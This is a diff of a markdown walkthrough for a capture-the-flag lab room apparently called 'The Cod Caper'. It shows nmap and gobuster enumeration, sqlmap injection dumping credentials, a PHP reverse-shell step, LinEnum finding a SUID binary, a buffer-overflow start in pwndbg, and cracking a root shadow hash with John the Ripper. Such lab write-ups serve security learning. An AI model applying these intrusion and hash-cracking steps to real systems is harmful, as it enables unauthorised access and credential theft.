@@ -14,7 +14,7 @@
 
 **Task 1:**
 
-***Instruction:***
+-***Instruction:***
 -Hello there my name is Pingu. I've come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn't eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I'll be guiding you through the process.
 
 -Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommended
@@ -23,7 +23,7 @@
 
 -Recommended Tool - nmap:
 
-**Nmap**
+-**Nmap**
      
     -kali@kali:~$ nmap -vv -sC -sV 10.10.85.135 
      Scanning 10.10.85.135 [1000 ports]
@@ -72,7 +72,7 @@
    
 **Task 3 (Web Enumeration)**
     
- **Gobuster:**
+ -**Gobuster:**
          
          kali@kali:~/Documents$ gobuster dir -u http://10.10.85.135 -w big.txt -x php,txt,html
          ===============================================================
@@ -110,7 +110,7 @@
      
 **Task 4 (Web Exploitation)**
 
-**sqlmap**
+-**sqlmap**
        
        kali@kali:~$ sqlmap -v -u 
        http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
@@ -172,7 +172,7 @@
      
 **Task 5 (Command Execution)**
 
-**PHP reverse shell & netcat** 
+-**PHP reverse shell & netcat** 
  
 ![alt text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Linux/The%20Cod%20Caper/Image/Screenshot%202020-11-09%2013_30_06.png)
 
@@ -243,8 +243,6 @@
             $ cat pass
               pinguapingu   
                 
-Note(for beginners):First run the Netcat command & then PHP in admin commands.
-
 1) How many files are in the current directory?
 
      **3**
@@ -257,16 +255,88 @@ Note(for beginners):First run the Netcat command & then PHP in admin commands.
 
      **pinguapingu**
                 
+**Task 6 (LinEnum)**  
+
+-**LinEnum**
+     
+            kali@kali:~/Downloads$ scp LinEnum.sh pingu@10.10.210.94:/tmp
+            pingu@10.10.210.94's password: 
+            
+            pingu@ubuntu:/tmp$ chmod +x LinEnum.sh 
+            pingu@ubuntu:/tmp$ ./LinEnum.sh 
+            [-] SUID files:
+            -r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
+            -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+            -rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
+            -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
+            -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
+            -rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
+            -rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
+            -rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
+            -rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+            -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+            -rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-   helper
+            -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+            -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+            -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+            -rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+            -rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+            -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+            -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+
+1) What is the interesting path of the interesting suid file
+    **/opt/secret/root**
                 
+**Task 7 (pwndbg)**
+            
+            pingu@ubuntu:~$ gdb /opt/secret/root
+            GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+            Copyright (C) 2016 Free Software Foundation, Inc.
+            License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+            This is free software: you are free to change and redistribute it.
+            There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+            and "show warranty" for details.
+            This GDB was configured as "x86_64-linux-gnu".
+            Type "show configuration" for configuration details.
+            For bug reporting instructions, please see:
+            <http://www.gnu.org/software/gdb/bugs/>.
+            Find the GDB manual and other documentation resources online at:
+            <http://www.gnu.org/software/gdb/documentation/>.
+            For help, type "help".
+            Type "apropos word" to search for commands related to "word"...
+            pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
+            pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+            Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
+            pwndbg> r < <(cyclic 50)   
+
+**Task 10 (Finishing the job)**
+ 
+               root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYto
+               F1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+               
+               **JohnTheRipper**
+               kali@kali:~/Documents$ john --wordlist=rockyou.txt hashfile.txt 
+               Created directory: /home/kali/.john
+               Using default input encoding: UTF-8
+               Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+               Cost 1 (iteration count) is 5000 for all loaded hashes
+               Press 'q' or Ctrl-C to abort, almost any other key for status
+               love2fish        (root)
+               1g 0:00:02:48 DONE (2020-11-09 02:54) 0.005926g/s 1421p/s 1421c/s 1421C/s   lovelife07..lossims
+               Use the "--show" option to display all of the cracked passwords reliably
+               Session completed
                 
-                
-                
-                
-                
-                
-                
-                
-                
+ 1)  What is the root password!
+ 
+     **love2fish**
+                              
+**Task 11 (Thank you!)**
+      
+                    pingu@ubuntu:~$su root
+                    password:
+                    
+                    root@ubuntu:~$
+
                 
                 
                 
